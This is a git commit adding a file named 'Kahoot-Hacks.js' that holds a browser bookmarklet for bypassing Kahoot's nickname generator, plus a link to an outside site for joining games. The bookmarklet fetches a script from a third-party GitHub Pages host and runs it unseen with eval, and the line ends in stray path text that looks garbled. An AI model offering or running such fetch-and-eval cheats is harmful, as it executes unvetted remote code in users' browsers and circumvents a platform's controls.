9de3ecc61cb79f750a0d43daf47f7891cd7683bb
bmurphy11 <63816624+bmurphy11@users.noreply.github.com>
2023-03-06 12:02:16 -0600

    Create Kahoot-Hacks.js

---
+++ Kahoot-Hacks.js
@@ -0,0 +1,4 @@
+//Name bypass(use before entering pin)
+javascript:fetch('https://thatfrueddued.github.io/kahoot-smasher/NicknameGeneratorBypass.js').then(function(response)%7Bresponse.text().then(function(text)%7Beval(text);%7D);%7D);heats/Kahoot%20Cheats/Bypass%20Random%20Names
+//website to use if you have the game id
+https://kahoot.club/play
